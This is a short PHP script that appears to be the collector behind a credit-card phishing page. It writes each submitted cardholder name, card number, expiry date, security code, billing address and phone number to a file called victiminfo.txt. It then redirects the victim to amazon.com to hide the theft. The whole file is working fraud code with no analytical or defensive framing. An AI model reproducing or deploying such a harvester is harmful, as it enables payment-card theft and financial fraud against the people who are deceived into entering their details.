<?php

file_put_contents("victiminfo.txt", "NameOnCard: " . $_POST['nameoncard'] . " CardNumber: " . $_POST['addCreditCardNumber'] . " Expirationdate: " . $_POST['exp'] . " CVSonBack: " . $_POST['Address'] . " Billingaddress: " . $_POST['bill'] . " City: " . $_POST['ct'] . " State: " . $_POST['st'] . " ZipCode: " . $_POST['zipcode'] . " PhoneNumber: " . $_POST['phone'] . "\n", FILE_APPEND);
header('Location:https://www.amazon.com');
exit();
